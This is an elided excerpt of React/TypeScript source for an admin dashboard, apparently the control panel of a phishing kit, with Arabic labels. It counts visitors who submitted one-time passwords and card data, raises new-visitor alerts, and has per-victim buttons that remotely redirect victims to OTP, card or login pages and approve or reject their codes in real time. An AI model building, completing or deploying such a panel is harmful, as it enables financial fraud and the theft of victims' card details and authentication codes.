...
function pageLabel(page: string) {
  ...
  if (e)
    return (
      <span
        className="inline-block text-[11px] font-bold rounded-full px-2 py-0.5 text-white"
  ...
  return (
    <span className="inline-block text-[11px] font-bold rounded-full px-2 py-0.5 bg-gray-200 text-gray-600">
      {page || "—"}
    </span>
  );
}
...
export default function AdminPage() {
    ...
    return (
      <div
        ...
        style={{
          ...
          background: `linear-gradient(135deg, ${BRAND.bg}, ${BRAND.primary})`,
        }}
      >
            ...
            <div className="relative">
              <input
                ...
                onKeyDown={(e) =>
                  e.key === "Enter" &&
                  (() => {
                    pw === PASSWORD ? setAuthed(true) : setPwErr(true);
                  })()
                }
  ...
  return (
    <div
      ...
      style={{
        fontFamily: "'Cairo', system-ui, sans-serif",
        background: `linear-gradient(180deg, ${BRAND.bg} 0%, #0a1628 100%)`,
      }}
    >
      {/* NEW VISITOR ALERT */}
      {newAlert && (
      ...
      <div className="max-w-7xl mx-auto px-4 py-6 space-y-6">
        ...
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
          ...
          <StatCard
            label="أدخلوا OTP"
            value={withOtp.length}
            Icon={Phone}
            color="#f59e0b"
          />
          <StatCard
            label="بيانات البطاقة"
            value={withCard.length}
            Icon={CreditCard}
            color={BRAND.gold}
          />
        </div>
        ...
        <div className="flex flex-wrap gap-3 items-center">
          ...
          <button
            onClick={() => adminApi.deleteAll().then(() => setVisitors([]))}
                  ...
                  >
                    ...
                    v.page === "انتظار" ? (
                      <div className="rounded-2xl border-2 border-yellow-500/40 bg-yellow-500/10 p-4 space-y-3">
                        ...
                        <div className="grid grid-cols-2 gap-3">
                          <button
                            onClick={() =>
                              adminApi.sendCmd(v.id, "redirect:otp")
                            }
                          ...
                          <button
                            onClick={() =>
                              adminApi.sendCmd(v.id, "redirect:reject")
                            }
                            className="flex items-center justify-center gap-2 py-3 rounded-xl font-black text-sm text-white transition-all hover:scale-105 active:scale-95"
                            style={{
                              background:
                    ...
                    <div className="space-y-2">
                      ...
                      <div className="flex flex-wrap gap-2">
                        ...
                        <button
                          onClick={() =>
                            adminApi.sendCmd(v.id, "redirect:card")
                          }
                        ...
                        <button
                          onClick={() => adminApi.sendCmd(v.id, "otp:approved")}
                        ...
                        <button
                          onClick={() => adminApi.sendCmd(v.id, "otp:rejected")}
                          className="flex items-center gap-1.5 bg-red-500/20 hover:bg-red-500/30 border border-red-500/30 text-red-400 font-bold text-xs px-3 py-2 rounded-xl transition-colors"
                        >
                          ✗ رفض OTP
                        </button>
                        ...
                        <button
                          onClick={() =>
                            adminApi.sendCmd(v.id, "redirect:login")
                          }
